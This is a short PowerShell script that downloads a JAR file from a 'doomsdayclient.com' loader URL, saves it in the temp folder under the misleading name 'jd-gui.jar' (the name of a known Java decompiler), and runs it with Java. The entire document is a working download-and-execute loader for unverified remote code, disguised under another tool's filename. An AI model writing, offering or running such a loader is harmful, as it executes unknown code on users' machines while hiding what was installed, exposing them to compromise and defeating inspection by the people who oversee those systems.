# Define the URL of the JAR file
$jarUrl = "https://doomsdayclient.com/loader/v5ab4f8018d.jar"

# Define a temporary path for the downloaded JAR (saved as jd-gui.jar)
$jarPath = Join-Path $env:TEMP "jd-gui.jar"

# Download the JAR file to disk
Invoke-WebRequest -Uri $jarUrl -OutFile $jarPath -UseBasicParsing

# Define the path to the Java executable
$javaPath = "C:\Program Files\Java\jre1.8.0_301\bin\java.exe"

# Execute the JAR file using the Java executable
Start-Process -FilePath $javaPath -ArgumentList "-jar", $jarPath -NoNewWindow -Wait
